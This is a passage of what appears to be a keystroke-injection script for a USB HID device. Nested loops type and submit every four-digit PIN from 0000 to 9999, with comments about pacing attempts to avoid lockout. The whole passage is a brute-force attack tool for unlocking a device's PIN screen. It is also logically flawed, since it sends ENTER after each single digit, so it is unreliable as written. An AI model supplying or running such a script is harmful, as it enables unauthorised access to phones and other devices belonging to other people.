// --- SECTION 2: SEQUENTIAL BRUTE FORCE (0000 - 9999) ---
// Nested loops to cover every combination systematically
[DELAY 500]
FOR (a = 0; a < 10; a++) {
    FOR (b = 0; b < 10; b++) {
        FOR (c = 0; c < 10; c++) {
            FOR (d = 0; d < 10; d++) {
                // Small delay between keystrokes to ensure registration
                [DELAY 50]
                
                // Send the digits as variables
                $a ENTER
                $b ENTER
                $c ENTER
                $d ENTER
                
                // Submit attempt (Enter key)
                [ENTER]
                
                // Delay after each full PIN attempt to avoid UI lag or lockout
                [DELAY 500]
            }
        }
    }
}
